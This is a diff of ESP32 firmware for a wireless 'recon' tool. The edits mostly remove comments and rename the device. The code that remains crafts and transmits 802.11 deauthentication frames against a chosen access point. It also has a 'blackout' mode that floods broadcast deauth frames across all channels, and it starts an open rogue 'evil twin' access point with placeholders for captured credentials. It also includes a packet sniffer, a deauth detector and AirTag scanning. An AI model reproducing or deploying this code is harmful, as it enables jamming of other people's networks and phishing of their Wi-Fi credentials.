@@ -3,24 +3,17 @@
 #include "esp_wifi.h"
 #include <NimBLEDevice.h>
 
-// ============================================
-// Recon Service Implementation
-// All commands via volatile flags - processed in loop only
-// ============================================
-
 #define MAX_WIFI_RESULTS 30
 #define MAX_BLE_RESULTS  30
 #define DEAUTH_BURST_COUNT 10
 #define DEAUTH_BURST_INTERVAL_MS 50
 
-// --- Storage ---
 static ReconWiFi wifi_results[MAX_WIFI_RESULTS];
 static int wifi_count = 0;
 
 static BleDevice ble_results[MAX_BLE_RESULTS];
 static int ble_count = 0;
 
-// --- Command flags (set from any context, consumed in loop) ---
 static volatile bool flag_wifi_scan = false;
 static volatile bool flag_ble_scan = false;
 static volatile bool flag_deauth = false;
@@ -30,31 +23,25 @@ static volatile bool flag_deauth_detect = false;
 static volatile bool flag_evil_twin = false;
 static volatile bool flag_stop = false;
 
-// --- BLE scan parameters ---
 static volatile int ble_scan_duration = 10;
 
-// --- Sniffer ---
 static int sniffer_channel = 0;
 static int sniffer_packets = 0;
 static int deauth_detected_count = 0;
 static bool sniffer_hopping = false;
 static uint32_t sniffer_hop_time = 0;
 
-// --- Evil Twin ---
 static char et_ssid[33] = "";
 static int et_channel = 6;
 static char et_last_credential[256] = "";
 static volatile bool et_new_cred = false;
 
-// --- Deauth all (blackout) ---
 static int blackout_current_ch = 1;
 static uint32_t blackout_ch_time = 0;
 
-// --- Deauth parameters ---
 static char deauth_bssid[18] = {0};
 static int  deauth_channel = 1;
 
-// --- State ---
 enum ReconState {
     RECON_IDLE,
     RECON_WIFI_SCANNING,
@@ -69,42 +56,28 @@ enum ReconState {
 };
 static ReconState state = RECON_IDLE;
 
-// --- Deauth timing ---
 static uint32_t deauth_last_burst_ms = 0;
 static int deauth_frames_sent = 0;
 
-// --- BLE scan state ---
 static NimBLEScan* pBLEScan = nullptr;
 static bool ble_scan_started = false;
 static uint32_t ble_scan_start_ms = 0;
 static int ble_scan_target_duration = 10;
 
-// --- WiFi scan state ---
 static bool wifi_scan_requested = false;
 
-// --- Deauth frame template ---
-// 802.11 deauthentication frame
-// [0-1]  Frame Control: 0x00C0 (deauth)
-// [2-3]  Duration: 0x0000
-// [4-9]  Destination (broadcast)
-// [10-15] Source (BSSID)
-// [16-21] BSSID
-// [22-23] Sequence number (0)
-// [24-25] Reason code: 7 (Class 3 frame from nonassociated STA)
 static uint8_t deauth_frame[26] = {
-    0xC0, 0x00,                         // Frame Control (deauth)
-    0x00, 0x00,                         // Duration
-    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // DA: broadcast
-    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // SA: BSSID (filled in)
-    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // BSSID (filled in)
-    0x00, 0x00,                         // Sequence number
-    0x07, 0x00                          // Reason code: 7
+    0xC0, 0x00,
+    0x00, 0x00,
+    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
+    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+    0x00, 0x00,
+    0x07, 0x00
 };
 
-// --- Helpers ---
-
 static void parse_bssid(const char* str, uint8_t* out) {
-    // Parse "AA:BB:CC:DD:EE:FF" into 6 bytes
+
     unsigned int b[6];
     if (sscanf(str, "%x:%x:%x:%x:%x:%x", &b[0], &b[1], &b[2], &b[3], &b[4], &b[5]) == 6) {
         for (int i = 0; i < 6; i++) out[i] = (uint8_t)b[i];
@@ -129,25 +102,22 @@ static bool check_is_airtag(const NimBLEAdvertisedDevice* dev) {
     if (!dev->haveManufacturerData()) return false;
     auto mfg = dev->getManufacturerData();
     if (mfg.size() < 3) return false;
-    // Apple company ID is 0x004C (little-endian: 0x4C, 0x00)
+
     if ((uint8_t)mfg[0] == 0x4C && (uint8_t)mfg[1] == 0x00) {
         uint8_t type = (uint8_t)mfg[2];
-        // 0x12 = FindMy (AirTag), 0x07 = FindMy (older/accessory)
+
         if (type == 0x12 || type == 0x07) return true;
     }
     return false;
 }
 
-// --- BLE Scan Callback ---
 class ReconBLECallbacks : public NimBLEScanCallbacks {
     void onResult(const NimBLEAdvertisedDevice* dev) override {
         if (ble_count >= MAX_BLE_RESULTS) return;
 
-        // Hold temp in local std::string so c_str() pointer stays valid
         std::string addr_str = dev->getAddress().toString();
         const char* addr = addr_str.c_str();
 
-        // Check for duplicate MACs
         for (int i = 0; i < ble_count; i++) {
             if (strcmp(ble_results[i].mac, addr) == 0) return;
         }
@@ -176,13 +146,9 @@ class ReconBLECallbacks : public NimBLEScanCallbacks {
 
 static ReconBLECallbacks bleScanCB;
 
-// --- Init ---
-
 void recon_service_init(void) {
     Serial.println("[RECON] Service initialized");
 }
-
-// --- Command setters ---
 
 void recon_request_wifi_scan(void) {
     flag_wifi_scan = true;
@@ -203,8 +169,6 @@ void recon_request_deauth(const char* bssid, int channel) {
 void recon_request_stop(void) {
     flag_stop = true;
 }
-
-// --- State queries ---
 
 bool recon_is_scanning(void) {
     return state == RECON_WIFI_SCANNING || state == RECON_BLE_SCANNING;
@@ -232,13 +196,11 @@ const BleDevice* recon_get_ble(int idx) {
     return &ble_results[idx];
 }
 
-// --- Internal state handlers ---
-
 static void start_wifi_scan(void) {
     Serial.println("[RECON] Starting WiFi scan (AP_STA mode)");
     wifi_count = 0;
-    // Async scan - works alongside SoftAP in WIFI_AP_STA mode (original version)
-    WiFi.scanNetworks(true);  // true = async
+
+    WiFi.scanNetworks(true);
     wifi_scan_requested = true;
     state = RECON_WIFI_SCANNING;
 }
@@ -279,7 +241,7 @@ static void start_ble_scan(void) {
     ble_count = 0;
 
     if (!NimBLEDevice::isInitialized()) {
-        NimBLEDevice::init("PipBoy-scan");
+        NimBLEDevice::init("SCR-Scan");
     }
 
     pBLEScan = NimBLEDevice::getScan();
@@ -289,7 +251,7 @@ static void start_ble_scan(void) {
     pBLEScan->setWindow(99);
 
     ble_scan_target_duration = ble_scan_duration;
-    // NimBLE v2: duration is in MILLISECONDS (not seconds like v1)
+
     pBLEScan->start(ble_scan_target_duration * 1000, false);
     ble_scan_started = true;
     ble_scan_start_ms = millis();
@@ -304,7 +266,6 @@ static void poll_ble_scan(void) {
         return;
     }
 
-    // Check if scan is done (NimBLE scan runs for the specified duration)
     if (!pBLEScan->isScanning()) {
         ble_scan_started = false;
         state = RECON_IDLE;
@@ -322,18 +283,15 @@ static void stop_ble_scan(void) {
 static void start_deauth(void) {
     Serial.printf("[RECON] Starting deauth: BSSID=%s CH=%d\n", deauth_bssid, deauth_channel);
 
-    // Build deauth frame with target BSSID
     uint8_t bssid_bytes[6];
     parse_bssid(deauth_bssid, bssid_bytes);
-    memcpy(deauth_frame + 10, bssid_bytes, 6);  // SA
-    memcpy(deauth_frame + 16, bssid_bytes, 6);  // BSSID
+    memcpy(deauth_frame + 10, bssid_bytes, 6);
+    memcpy(deauth_frame + 16, bssid_bytes, 6);
 
-    // Stop SoftAP - can't do deauth while AP is running
     WiFi.softAPdisconnect(true);
     WiFi.mode(WIFI_STA);
     WiFi.disconnect();
 
-    // Set to promiscuous mode on target channel
     esp_wifi_set_promiscuous(true);
     esp_wifi_set_channel(deauth_channel, WIFI_SECOND_CHAN_NONE);
 
@@ -347,7 +305,6 @@ static void poll_deauth(void) {
     if (now - deauth_last_burst_ms < DEAUTH_BURST_INTERVAL_MS) return;
     deauth_last_burst_ms = now;
 
-    // Send a burst of deauth frames
     for (int i = 0; i < DEAUTH_BURST_COUNT; i++) {
         esp_wifi_80211_tx(WIFI_IF_STA, deauth_frame, sizeof(deauth_frame), false);
     }
@@ -361,19 +318,16 @@ static void poll_deauth(void) {
 static void stop_deauth_and_restore(void) {
     Serial.printf("[RECON] Deauth stopped after %d frames. Restoring AP...\n", deauth_frames_sent);
 
-    // Stop promiscuous mode
     esp_wifi_set_promiscuous(false);
 
-    // Restore AP_STA mode and restart SoftAP
     WiFi.mode(WIFI_AP_STA);
-    WiFi.softAP("PipBoy-3000", "pip12345");
+    WiFi.softAP("SCR Terminal", "pip12345");
 
     deauth_frames_sent = 0;
     state = RECON_IDLE;
     Serial.println("[RECON] AP restored");
 }
 
-// --- Promiscuous callback for sniffer/deauth_detect ---
 static void IRAM_ATTR promisc_cb(void *buf, wifi_promiscuous_pkt_type_t type) {
     if (type != WIFI_PKT_MGMT) return;
     wifi_promiscuous_pkt_t *pkt = (wifi_promiscuous_pkt_t *)buf;
@@ -382,13 +336,11 @@ static void IRAM_ATTR promisc_cb(void *buf, wifi_promiscuous_pkt_type_t type) {
 
     sniffer_packets++;
 
-    // Deauth detection: subtype 0x0C = deauth, 0x0A = disassoc
     if (subtype == 0x0C || subtype == 0x0A) {
         deauth_detected_count++;
     }
 }
 
-// --- Blackout (deauth all channels) ---
 static void start_deauth_all(void) {
     Serial.println("[RECON] Blackout: deauth all channels");
     WiFi.softAPdisconnect(true);
@@ -400,10 +352,9 @@ static void start_deauth_all(void) {
     deauth_frames_sent = 0;
     esp_wifi_set_channel(1, WIFI_SECOND_CHAN_NONE);
 
-    // Broadcast deauth frame (FF:FF:FF:FF:FF:FF)
-    memset(deauth_frame + 4, 0xFF, 6);  // DA = broadcast
-    memset(deauth_frame + 10, 0xFF, 6); // SA = broadcast
-    memset(deauth_frame + 16, 0xFF, 6); // BSSID = broadcast
+    memset(deauth_frame + 4, 0xFF, 6);
+    memset(deauth_frame + 10, 0xFF, 6);
+    memset(deauth_frame + 16, 0xFF, 6);
 
     state = RECON_DEAUTH_ALL;
 }
@@ -418,7 +369,6 @@ static void poll_deauth_all(void) {
     }
     deauth_frames_sent += 5;
 
-    // Switch channel every 500ms
     if (now - blackout_ch_time > 500) {
         blackout_current_ch++;
         if (blackout_current_ch > 13) blackout_current_ch = 1;
@@ -427,7 +377,6 @@ static void poll_deauth_all(void) {
     }
 }
 
-// --- Sniffer (promiscuous capture) ---
 static void start_sniffer(int ch) {
     Serial.printf("[RECON] Sniffer starting CH=%d\n", ch);
     WiFi.softAPdisconnect(true);
@@ -446,7 +395,7 @@ static void start_sniffer(int ch) {
 
 static void poll_sniffer(void) {
     if (!sniffer_hopping) return;
-    // Hop channels every 200ms
+
     if (millis() - sniffer_hop_time > 200) {
         sniffer_channel++;
         if (sniffer_channel > 13) sniffer_channel = 1;
@@ -455,7 +404,6 @@ static void poll_sniffer(void) {
     }
 }
 
-// --- Deauth detect (passive) ---
 static void start_deauth_detect(void) {
     Serial.println("[RECON] Deauth detector starting");
     WiFi.softAPdisconnect(true);
@@ -472,19 +420,16 @@ static void start_deauth_detect(void) {
     state = RECON_DEAUTH_DETECTING;
 }
 
-// --- Evil Twin (rogue AP + captive portal) ---
 static void start_evil_twin(void) {
     Serial.printf("[RECON] Evil Twin: SSID=%s CH=%d\n", et_ssid, et_channel);
     WiFi.softAPdisconnect(true);
     WiFi.mode(WIFI_AP);
-    WiFi.softAP(et_ssid, NULL, et_channel); // open AP, no password
-    // TODO: add DNS server for captive portal redirect
-    // TODO: serve credential capture HTML
+    WiFi.softAP(et_ssid, NULL, et_channel);
+
     state = RECON_EVIL_TWIN;
     Serial.printf("[RECON] Rogue AP started: %s on CH%d\n", et_ssid, et_channel);
 }
 
-// --- New command setters ---
 void recon_request_deauth_all(void) { flag_deauth_all = true; }
 void recon_request_sniffer(int ch) { sniffer_channel = ch; flag_sniffer = true; }
 void recon_request_deauth_detect(void) { flag_deauth_detect = true; }
@@ -501,10 +446,8 @@ int recon_deauth_detect_count(void) { return deauth_detected_count; }
 const char* recon_et_last_cred(void) { return et_last_credential; }
 bool recon_et_has_new_cred(void) { bool r = et_new_cred; et_new_cred = false; return r; }
 
-// --- Main loop ---
-
 void recon_service_loop(void) {
-    // Process stop flag first (highest priority)
+
     if (flag_stop) {
         flag_stop = false;
         flag_wifi_scan = false;
@@ -537,7 +480,6 @@ void recon_service_loop(void) {
         return;
     }
 
-    // Process command flags (only when idle)
     if (state == RECON_IDLE) {
         if (flag_wifi_scan) {
             flag_wifi_scan = false;
@@ -576,7 +518,6 @@ void recon_service_loop(void) {
         }
     }
 
-    // Poll active operations
     switch (state) {
         case RECON_WIFI_SCANNING:
             poll_wifi_scan();
@@ -594,7 +535,7 @@ void recon_service_loop(void) {
             poll_sniffer();
             break;
         case RECON_DEAUTH_DETECTING:
-            poll_sniffer(); // same channel hopping
+            poll_sniffer();
             break;
         default:
             break;
